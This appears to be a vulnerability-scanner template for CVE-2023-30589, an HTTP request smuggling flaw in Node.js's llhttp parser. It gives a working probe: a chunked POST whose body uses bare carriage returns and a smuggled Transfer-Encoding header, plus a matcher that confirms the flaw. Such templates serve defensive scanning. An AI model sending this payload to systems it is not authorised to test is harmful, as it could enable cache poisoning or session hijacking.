id: CVE-2023-30589

info:
  name: Node.js llhttp HTTP Request Smuggling
  author: ProjectDiscoveryAI
  severity: high
  description: The llhttp parser in the http module in Node v20.2.0 does not strictly use the CRLF sequence to delimit HTTP requests, allowing for HTTP Request Smuggling (HRS).
  impact: |
    Successful exploitation could lead to cache poisoning, session hijacking, or other attacks.
  remediation: |
    Apply the vendor-supplied patches or updates to mitigate the vulnerability.

http:
  - method: POST
    path:
      - "{{BaseURL}}"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Transfer-Encoding: chunked

    body: |
      X-Abc:\r
      xTransfer-Encoding: chunked\r
      \r
      1\r
      A\r
      0\r
      \r
    matchers:
      - type: word
        words:
          - "x-abc"
        part: header
    unsafe: true
